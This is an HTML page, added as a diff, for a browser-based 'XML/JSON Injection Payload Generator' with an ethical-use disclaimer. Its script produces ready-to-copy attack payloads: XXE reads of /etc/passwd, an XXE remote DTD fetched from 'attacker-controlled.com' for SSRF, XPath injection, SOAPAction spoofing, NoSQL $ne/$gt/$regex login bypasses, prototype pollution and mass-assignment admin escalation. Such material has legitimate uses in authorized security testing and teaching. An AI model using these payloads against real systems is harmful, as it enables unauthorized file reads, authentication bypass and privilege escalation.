@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XML/JSON Injection Payload Generator (Simplified)</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6; /* Tailwind gray-100 */
+        }
+        .container {
+            max-width: 1000px;
+            margin: 2rem auto;
+            background-color: white;
+            padding: 2rem;
+            border-radius: 0.75rem; /* Tailwind rounded-xl */
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); /* Tailwind shadow-lg */
+        }
+        h1 {
+            color: #3b82f6; /* Tailwind blue-500 */
+            text-align: center;
+            margin-bottom: 1.5rem;
+            border-bottom: 2px solid #e5e7eb; /* Tailwind gray-200 */
+            padding-bottom: 0.75rem;
+        }
+        .disclaimer {
+            background-color: #fef3c7; /* Tailwind amber-100 */
+            padding: 1rem;
+            border-left: 5px solid #f59e0b; /* Tailwind amber-500 */
+            margin-bottom: 1.5rem;
+            font-size: 0.9em;
+            border-radius: 0.375rem; /* Tailwind rounded-md */
+        }
+        .category {
+            margin-bottom: 2rem;
+            border: 1px solid #e5e7eb; /* Tailwind gray-200 */
+            padding: 1.5rem;
+            border-radius: 0.5rem; /* Tailwind rounded-lg */
+            background-color: #fafafa; 
+        }
+        .category h2 {
+            color: #ef4444; /* Tailwind red-500 for XML */
+            margin-bottom: 1rem;
+            font-size: 1.5em;
+            font-weight: 600;
+        }
+        .category.json h2 {
+            color: #2563eb; /* Tailwind blue-600 for JSON */
+        }
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: #374151; /* Tailwind gray-700 */
+        }
+        select, input[type="text"], textarea {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid #d1d5db; /* Tailwind gray-300 */
+            border-radius: 0.375rem; /* Tailwind rounded-md */
+            box-sizing: border-box;
+            font-size: 1rem;
+            margin-bottom: 0.75rem;
+            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+        }
+        select:focus, input[type="text"]:focus, textarea:focus {
+            border-color: #3b82f6; /* Tailwind blue-500 */
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.3); 
+            outline: none;
+        }
+        button {
+            background-color: #3b82f6; /* Tailwind blue-500 */
+            color: white;
+            border: none;
+            padding: 0.75rem 1.25rem;
+            border-radius: 0.375rem; /* Tailwind rounded-md */
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 500;
+            margin-top: 0.5rem;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #2563eb; /* Tailwind blue-600 */
+        }
+        #result-container {
+            margin-top: 1.5rem;
+        }
+        #result-label {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+        #result-payload {
+            padding: 1rem;
+            background-color: #1f2937; /* Tailwind gray-800 */
+            color: #d1d5db; /* Tailwind gray-300 */
+            border: 1px solid #4b5563; /* Tailwind gray-600 */
+            border-radius: 0.375rem; /* Tailwind rounded-md */
+            min-height: 100px;
+            word-wrap: break-word;
+            font-family: 'Consolas', 'Monaco', monospace;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .copy-btn {
+            background-color: #10b981; /* Tailwind emerald-500 */
+        }
+        .copy-btn:hover {
+            background-color: #059669; /* Tailwind emerald-600 */
+        }
+        .examples {
+            margin-top: 2rem;
+            background-color: #f9fafb; /* Tailwind gray-50 */
+            padding: 1.5rem;
+            border-radius: 0.5rem; /* Tailwind rounded-lg */
+            border: 1px solid #e5e7eb; /* Tailwind gray-200 */
+        }
+        .examples h3 {
+            color: #1d4ed8; /* Tailwind blue-700 */
+            margin-top: 0;
+            margin-bottom: 1rem;
+            font-weight: 600;
+        }
+        .examples ul {
+            padding-left: 1.25rem; 
+            list-style-type: disc;
+        }
+        .examples li {
+            margin-bottom: 0.5rem;
+            color: #4b5563; /* Tailwind gray-600 */
+        }
+        .examples code {
+            background-color: #e5e7eb; /* Tailwind gray-200 */
+            padding: 0.125rem 0.375rem; 
+            border-radius: 0.25rem; /* Tailwind rounded-sm */
+            font-family: 'Consolas', 'Monaco', monospace;
+            color: #1f2937; /* Tailwind gray-800 */
+        }
+        .custom-payload-input {
+            display: none; 
+            margin-top: 0.75rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>XML/JSON Injection Payload Generator (Simplified)</h1>
+
+        <div class="disclaimer">
+            <strong>Ethical Use Disclaimer:</strong> This tool is for <strong>educational purposes and authorized security research only</strong>. Unauthorized probing, testing, or exploitation of systems is illegal and unethical. Always obtain explicit permission before conducting any security assessments.
+        </div>
+
+        <div class="form-group mb-6">
+            <label for="target-param">Target Parameter/Key (e.g., username, id, data):</label>
+            <input type="text" id="target-param" placeholder="Enter target parameter name">
+        </div>
+
+        <div class="category xml">
+            <h2>XML Injection Payloads</h2>
+            <div class="form-group">
+                <label for="xml-payload-type">Select XML Payload Type:</label>
+                <select id="xml-payload-type">
+                    <option value="">-- Select Type --</option>
+                    <option value="basic_structure">Basic Structure Break</option>
+                    <option value="xpath_boolean">XPath Boolean-Based (Simple)</option>
+                    <option value="xxe_local_file">XXE - Local File Read</option>
+                    <option value="xxe_remote_dtd">XXE - Remote DTD Load (SSRF)</option>
+                    <option value="soap_action_spoofing">SOAPAction Spoofing</option>
+                    <option value="custom_xml">Custom XML Payload</option>
+                </select>
+                <div id="custom-xml-payload-div" class="custom-payload-input">
+                    <label for="custom-xml-payload-text">Enter Custom XML Payload:</label>
+                    <textarea id="custom-xml-payload-text" rows="3" placeholder=""></textarea>
+                </div>
+            </div>
+        </div>
+
+        <div class="category json">
+            <h2>JSON Injection Payloads</h2>
+            <div class="form-group">
+                <label for="json-payload-type">Select JSON Payload Type:</label>
+                <select id="json-payload-type">
+                    <option value="">-- Select Type --</option>
+                    <option value="basic_break_string">Basic Structure Break (String Context)</option>
+                    <option value="nosql_gt">NoSQL Injection ($gt)</option>
+                    <option value="nosql_ne_login">NoSQL Injection (Login Bypass $ne)</option>
+                    <option value="nosql_regex">NoSQL Injection ($regex basic)</option>
+                    <option value="prototype_pollution">Prototype Pollution (Basic)</option>
+                    <option value="mass_assignment">Mass Assignment</option>
+                    <option value="custom_json">Custom JSON Payload</option>
+                </select>
+                 <div id="custom-json-payload-div" class="custom-payload-input">
+                    <label for="custom-json-payload-text">Enter Custom JSON Payload:</label>
+                    <textarea id="custom-json-payload-text" rows="3" placeholder='e.g., {"user_id": "1", "isAdmin": true}'></textarea>
+                </div>
+            </div>
+        </div>
+
+        <div class="flex flex-col sm:flex-row items-center mt-8 space-y-2 sm:space-y-0 sm:space-x-4">
+            <button id="generate-btn" class="w-full sm:w-auto">Generate Payload</button>
+            <button id="copy-btn" class="copy-btn w-full sm:w-auto">Copy to Clipboard</button>
+        </div>
+
+        <div id="result-container" class="mt-8">
+            <label id="result-label" for="result-payload">Generated Payload:</label>
+            <div id="result-payload">Select a payload type and click "Generate Payload".</div>
+        </div>
+
+        <div class="examples mt-10">
+            <h3>Example Use Cases / Target Formats</h3>
+            <ul>
+                <li><strong>XML (e.g., in a POST body):</strong> <code>&lt;request&gt;&lt;param_name&gt;{PAYLOAD_HERE}&lt;/param_name&gt;&lt;/request&gt;</code></li>
+                <li><strong>JSON (e.g., in a POST body):</strong> <code>{"param_name": "{PAYLOAD_HERE_JSON_ESCAPED}"}</code></li>
+                <li>Remember to URL encode payloads if they are sent as URL parameters.</li>
+                <li>For XXE, ensure your <code>evilServer</code> hosts the specified DTD if using remote DTDs.</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log("DOM fully loaded and parsed. Initializing script (Simplified Version)...");
+
+            // DOM Elements
+            const xmlPayloadTypeSelect = document.getElementById('xml-payload-type');
+            const jsonPayloadTypeSelect = document.getElementById('json-payload-type');
+            const targetParamInput = document.getElementById('target-param');
+            const generateBtn = document.getElementById('generate-btn');
+            const copyBtn = document.getElementById('copy-btn');
+            const resultPayloadDiv = document.getElementById('result-payload');
+            const customXmlPayloadDiv = document.getElementById('custom-xml-payload-div');
+            const customJsonPayloadDiv = document.getElementById('custom-json-payload-div');
+            const customXmlPayloadText = document.getElementById('custom-xml-payload-text');
+            const customJsonPayloadText = document.getElementById('custom-json-payload-text');
+
+            // --- Sanity checks for element existence ---
+            if (!xmlPayloadTypeSelect) console.error("Error: xmlPayloadTypeSelect not found!");
+            if (!jsonPayloadTypeSelect) console.error("Error: jsonPayloadTypeSelect not found!");
+            if (!generateBtn) console.error("Error: generateBtn not found!");
+            if (!resultPayloadDiv) console.error("Error: resultPayloadDiv not found!");
+            if (!customXmlPayloadText) console.error("Error: customXmlPayloadText not found!");
+            if (!customJsonPayloadText) console.error("Error: customJsonPayloadText not found!");
+
+            // --- Event Listeners ---
+            if (xmlPayloadTypeSelect) {
+                xmlPayloadTypeSelect.addEventListener('change', function() {
+                    console.log("XML type changed to:", this.value);
+                    if (customXmlPayloadDiv) { 
+                        customXmlPayloadDiv.style.display = (this.value === 'custom_xml') ? 'block' : 'none';
+                    }
+                    if (this.value !== '' && jsonPayloadTypeSelect) { 
+                        jsonPayloadTypeSelect.value = ''; 
+                        if (customJsonPayloadDiv) customJsonPayloadDiv.style.display = 'none'; 
+                        if (customJsonPayloadText) customJsonPayloadText.value = ''; 
+                    }
+                });
+            }
+
+            if (jsonPayloadTypeSelect) {
+                jsonPayloadTypeSelect.addEventListener('change', function() {
+                    console.log("JSON type changed to:", this.value);
+                     if (customJsonPayloadDiv) { 
+                        customJsonPayloadDiv.style.display = (this.value === 'custom_json') ? 'block' : 'none';
+                    }
+                    if (this.value !== '' && xmlPayloadTypeSelect) { 
+                        xmlPayloadTypeSelect.value = ''; 
+                        if (customXmlPayloadDiv) customXmlPayloadDiv.style.display = 'none'; 
+                        if (customXmlPayloadText) customXmlPayloadText.value = ''; 
+                    }
+                });
+            }
+            
+            if (generateBtn) {
+                generateBtn.addEventListener('click', generatePayload);
+            } else {
+                console.error("Generate button not found, cannot attach click listener.");
+            }
+
+            if (copyBtn) {
+                copyBtn.addEventListener('click', copyPayload);
+            }
+
+            // --- Payload Generation Logic ---
+            function generatePayload() {
+                console.log("Generate button clicked - generatePayload function started.");
+                if (!xmlPayloadTypeSelect || !jsonPayloadTypeSelect || !targetParamInput || !resultPayloadDiv) {
+                    console.error("One or more critical DOM elements are missing in generatePayload.");
+                    if(resultPayloadDiv) resultPayloadDiv.textContent = "Error: Critical page element missing. Check console.";
+                    return;
+                }
+
+                const xmlType = xmlPayloadTypeSelect.value;
+                const jsonType = jsonPayloadTypeSelect.value;
+                const targetParam = targetParamInput.value.trim() || 'test_param'; 
+                let payload = '';
+                console.log("Selected XML Type:", xmlType, "Selected JSON Type:", jsonType, "Target Param:", targetParam);
+
+                if (xmlType) {
+                    console.log("Calling generateXmlPayload for type:", xmlType);
+                    payload = generateXmlPayload(xmlType, targetParam);
+                } else if (jsonType) {
+                    console.log("Calling generateJsonPayload for type:", jsonType);
+                    payload = generateJsonPayload(jsonType, targetParam);
+                } else {
+                    payload = 'Please select an XML or JSON payload type.';
+                    console.log("No type selected. Payload:", payload);
+                }
+                
+                console.log("Final payload to display:", payload);
+                 if (resultPayloadDiv) { 
+                    resultPayloadDiv.textContent = payload;
+                } else {
+                    console.error("resultPayloadDiv is null when trying to display payload.");
+                }
+            }
+
+            function generateXmlPayload(type, param) {
+                console.log("generateXmlPayload started with type:", type, "param:", param);
+                const evilServer = "attacker-controlled.com"; 
+                const localFileToRead = "/etc/passwd"; 
+                let generated = ""; 
+                switch (type) {
+                    case 'basic_structure':
+                        generated = `']]></${param}><malicious_element>evil_content</malicious_element><${param}><![CDATA[`;
+                        break;
+                    case 'xpath_boolean':
+                        generated = `' or '1'='1`; 
+                        break;
+                    case 'xxe_local_file':
+                        generated = `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://${localFileToRead}"> ]><${param}>&xxe;</${param}>`;
+                        break;
+                    case 'xxe_remote_dtd':
+                        // evil.dtd content example: <!ENTITY externalData "Loaded from remote DTD!">
+                        generated = `<!DOCTYPE foo [ <!ENTITY % dtd SYSTEM "http://${evilServer}/evil.dtd"> %dtd; ]><${param}>&externalData;</${param}>`;
+                        break;
+                    case 'soap_action_spoofing':
+                        generated = `<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Header><Action xmlns="http://schemas.microsoft.com/ws/2005/05/addressing/none">urn:intendedActionButActuallyMalicious</Action></soap:Header><soap:Body><${param}>data</${param}></soap:Body></soap:Envelope>`;
+                        break;
+                    case 'custom_xml':
+                        generated = customXmlPayloadText ? customXmlPayloadText.value.trim() : "Error: customXmlPayloadText not found";
+                        if (generated === "") generated = "";
+                        break; 
+                    default:
+                        generated = 'Invalid XML payload type selected.';
+                }
+                console.log("Generated XML payload (inside function):", generated);
+                return generated;
+            }
+
+            function generateJsonPayload(type, param) {
+                console.log("generateJsonPayload started with type:", type, "param:", param);
+                let generated = "";
+
+                switch (type) {
+                    case 'basic_break_string':
+                        generated = `", "${param}_injected": true, "comment":" Injected Comment`;
+                        break;
+                    case 'nosql_gt': 
+                        generated = `{"${param}": {"$gt": ""}}`; 
+                        break;
+                    case 'nosql_ne_login': 
+                        generated = `{"${param}": {"$ne": "a_very_unlikely_random_value_xyz123_for_ne_bypass"}}`;
+                        break;
+                    case 'nosql_regex':
+                        generated = `{"${param}": {"$regex": ".*admin.*", "$options": "i"}}`; 
+                        break;
+                    case 'prototype_pollution':
+                        generated = `{"__proto__": {"${param}_isAdmin": true, "hacked_by_prototype": "yes"}}`;
+                        break;
+                    case 'mass_assignment':
+                        generated = `{"${param}": "legitimate_value", "isAdmin": true, "role": "administrator"}`;
+                        break;
+                    case 'custom_json':
+                        generated = customJsonPayloadText ? customJsonPayloadText.value.trim() : "Error: customJsonPayloadText not found";
+                        if (generated === "") generated = '{"message": "Custom JSON: Please enter your payload"}';
+                        break;
+                    default:
+                        generated = 'Invalid JSON payload type selected.';
+                }
+                console.log("Generated JSON payload (inside function):", generated);
+                return generated;
+            }
+
+            // --- Utility Functions ---
+            function copyPayload() {
+                console.log("Copy button clicked.");
+                if (!resultPayloadDiv) {
+                    console.error("resultPayloadDiv not found in copyPayload.");
+                    return;
+                }
+                const payloadText = resultPayloadDiv.textContent;
+                if (payloadText && !payloadText.startsWith('Please select') && !payloadText.startsWith('Invalid') && payloadText.trim() !== "" && !payloadText.startsWith('Error:')) {
+                    navigator.clipboard.writeText(payloadText)
+                        .then(() => {
+                            console.log("Payload copied to clipboard.");
+                            const originalText = copyBtn.textContent;
+                            copyBtn.textContent = 'Copied!';
+                            copyBtn.classList.remove('bg-emerald-500', 'bg-red-500', 'bg-red-700');
+                            copyBtn.classList.add('bg-green-600'); 
+
+                            setTimeout(() => {
+                                copyBtn.textContent = originalText;
+                                copyBtn.classList.remove('bg-green-600');
+                                copyBtn.classList.add('bg-emerald-500');
+                            }, 2000);
+                        })
+                        .catch(err => {
+                            console.error('Failed to copy payload: ', err);
+                            resultPayloadDiv.textContent = 'Failed to copy. Check console (HTTPS/localhost needed for clipboard API).';
+                            const originalText = copyBtn.textContent;
+                            copyBtn.textContent = 'Copy Failed!';
+                            copyBtn.classList.remove('bg-emerald-500', 'bg-green-600');
+                            copyBtn.classList.add('bg-red-700'); 
+                             setTimeout(() => {
+                                copyBtn.textContent = originalText;
+                                copyBtn.classList.remove('bg-red-700');
+                                copyBtn.classList.add('bg-emerald-500');
+                            }, 2500);
+                        });
+                } else {
+                     console.log("Nothing valid to copy or error message present.");
+                     const originalText = copyBtn.textContent;
+                     copyBtn.textContent = 'Nothing to copy!';
+                     copyBtn.classList.remove('bg-emerald-500', 'bg-green-600', 'bg-red-700');
+                     copyBtn.classList.add('bg-red-500'); 
+
+                     setTimeout(() => {
+                        copyBtn.textContent = originalText;
+                        copyBtn.classList.remove('bg-red-500');
+                        copyBtn.classList.add('bg-emerald-500');
+                     }, 2000);
+                }
+            }
+
+            // Initial state for result
+            if (resultPayloadDiv) {
+                resultPayloadDiv.textContent = 'Select a payload type from XML or JSON section and click "Generate Payload".';
+            } else {
+                console.error("Initial resultPayloadDiv not found to set initial text.");
+            }
+            console.log("Script initialization complete (Simplified Version).");
+        }); // End of DOMContentLoaded
+    </script>
+</body>
+</html>
